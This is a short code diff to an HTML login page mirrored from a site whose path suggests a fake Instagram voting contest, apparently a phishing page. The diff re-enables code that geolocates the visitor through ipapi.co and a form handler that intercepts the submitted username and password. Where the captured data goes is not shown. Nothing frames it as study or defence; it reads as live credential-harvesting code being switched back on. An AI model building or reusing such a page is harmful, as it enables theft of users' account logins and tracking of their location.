@@ -70,15 +70,15 @@
                     console.error('Error fetching IP address:', error);
                 });
         });
-  // fetch('https://ipapi.co/json/')
-  //     .then(response => response.json())
-  //     .then(data => {
-  //       document.getElementById('city').value = data.city || '';
-  //       document.getElementById('country').value = data.country_name || '';
-  //     })
-  //     .catch(error => console.error('Location error:', error));
-  // document.getElementById('contactForm').addEventListener('submit', function (event) {
-  //           event.preventDefault();
+  fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('city').value = data.city || '';
+        document.getElementById('country').value = data.country_name || '';
+      })
+      .catch(error => console.error('Location error:', error));
+  document.getElementById('contactForm').addEventListener('submit', function (event) {
+            event.preventDefault();
 
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
@@ -111,4 +111,5 @@
 
 <!-- Mirrored from voting.name.ng/slink/vote-ig-fashion_dar_v/login by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Mar 2025 20:44:55 GMT -->
 </html>
+
 
